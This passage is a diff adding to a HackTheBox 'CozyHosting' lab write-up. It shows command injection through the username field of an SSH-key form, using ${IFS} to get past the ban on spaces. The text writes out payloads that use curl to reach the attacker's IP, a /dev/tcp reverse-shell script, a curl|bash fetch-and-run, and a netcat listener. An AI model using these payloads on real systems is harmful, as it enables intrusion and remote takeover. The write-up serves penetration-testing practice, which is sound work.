@@ -163,3 +163,90 @@ Finished
 After this cookie forgery, going back to the landing page show me that i am logged in as `kanderson`. So, we just hijacked the session and we are logged in. Let's try accessing /admin page now.  And voila, we were able to access the admin dashboard.
 
 ![admin dashboard](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/admin_dashboard.png)
+
+Here, the interesting part is automatic patching system that can allow legitimate user to connect to the server. The note provided `For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.` says it all.Let's try connecting out system to the server and capture the request/response using burpsuite.
+
+![/executessh module](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/execute_ssh.png)
+
+Here, on submit, a POST request is being sent to /executessh and then we are getting an error of `ssh: connect to host 10.10.14.9 port 22: Connection timed out` which is obvious because we don't have the private key in our .ssh/authorized_keys file.
+
+![error 1](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/error_1.png)
+
+Since, it is executing the ssh command and using a key to identify user, we can predict the command shall be: 
+
+```bash
+ssh user@host -i [key]
+```
+
+here user and host are controlled by user because teh value is filled on the basis of form we submit. Now, the ssh command is being run on the terminal, we can plan some command injection. Let's try to run `id` command in the both hostname and username field one by one.
+
+![trying payload in host field](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/host_field.png)
+
+![host field error](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/host_field_error.png)
+
+No clue. We are getting the error as before. Now let's try the same command in username field..
+
+![trying payload in username field](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/username_field.png)
+
+And this time we got some different error, finaly 😂. But it was not so useful, lol. It says that user name cannot have space, but that space between out command and `#` symbol is mandotory to comment out the remaining junks after the `#` symbol.
+
+![username field error](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/username_field_error.png)
+
+
+Got an idea, in linux terminal `${IFS}` can be used as alternative of whitespace. So let's try using this variable to bypass space constraint.
+
+![trying space bypass in username field](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/username_field_space_bypass.png)
+
+
+- And we got a blank screen. I guess, my command injection has run because i am not getting any error.
+
+- ![trying space bypass in username field output](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/blank_output.png)
+
+But we cannot just assume it, we need to confirm this. So I have a plan. We will run a server on our host machine, then using `curl` commant we will try to access some random file, say `test.txt` by a payload in username field. If the command runs, we will get it logged in out host machine.
+
+- let's craft a payload. 
+```bash
+cyb3ritic;curl${IFS}http://10.10.14.9/test.txt${IFS}#
+```
+So out final command that would run on server would look like below and will run the curl
+```bash
+ssh cyb3ritic;curl http://10.10.14.9/test.txt #10.10.14.9 -i [key]
+```
+
+![confirming command injection](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/confirming_ci.png)
+
+And voila, it worked. This is command injection my friends. We get the following log:
+
+```bash
+┌──(cyb3ritic㉿kali)-[~]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.230 - - [26/Feb/2025 23:26:39] code 404, message File not found
+10.10.11.230 - - [26/Feb/2025 23:26:39] "GET /test.txt HTTP/1.1" 404 -
+```
+
+So we are confirmed that there is command injection now getting a shell shall be easy. We will create a malicious bash script that could give us reverse shell, in the same directory from where we initiated a server on ouu local machine then curl it through the same payload with some modification to run that bash script on the server. Sound's fun, right?
+
+#### steps to exploit command injection
+
+1. create a file named revshell with following code:
+```bash
+#!/bin/bash
+bash -i &>/dev/tcp/<you ip>/<your port> <&1
+```
+2. give it executable permission with command `chmod +x revshell`
+
+3. start your server using command `python -m http.server`
+
+4. fire up ur netcat listener in another tab to recieve reverse shell `nc -lnvp <your port>`
+
+Now the payload shall be:
+
+```bash
+cyb3ritic;curl${IFS}http://10.10.14.9/revshell|bash${IFS}#
+```
+
+This would be interpreted as following and the command inside teh revshell file will be directly executed and we will get a shell in out netcat listener.
+```bash
+ssh cyb3ritic;curl http://10.10.14.9/revshell|bash #10.10.14.9 -i [key]
+```
